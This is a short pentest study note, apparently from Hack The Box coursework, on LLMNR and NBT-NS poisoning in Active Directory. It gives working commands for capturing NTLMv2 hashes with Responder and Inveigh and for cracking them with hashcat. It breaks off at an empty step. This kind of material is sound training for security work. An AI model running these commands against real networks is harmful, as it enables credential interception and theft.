---
date: 2025-06-08
tags:
  - ActiveDirectory
  - Technique
  - LLMNR
  - NBT-NS
  - Poisoning
---
```table-of-contents
```
# LLMNR & NBT-NS
- Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.
- Link-Local Multicast Name Resolution (LLMNR)
	- `UDP 5355` natively
	- If a machine attempts to resolve a host but DNS resolution fails, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. 
- NetBIOS Name Service (NBT-NS)
	- If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. 
	- `UDP 137` natively
## Weak Point
- When LLMNR/NBT-NS are used for name resolution, ==ANY host on the network can reply==. 
- This is where we come in with `Responder` to poison these requests. 
- With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host.
## Tools
|                                                       |                                                                                                     |
| ----------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| [Responder](https://github.com/lgandx/Responder)      | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.      |
| [Metasploit](https://www.metasploit.com/)             | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.  |
# From Linux Attack Host

1. Start Responder, and then run other enumeration tasks against the network to see what hashes responder picks up
```bash
sudo responder -I ens224 
```
2. Pass these hashes to `Hashcat` for cracking
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

# From Windows Attack Host

1. Use `Inveigh`. Import it onto PowerShell
```powershell-session
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```
2. Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
```powershell-session
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
3. 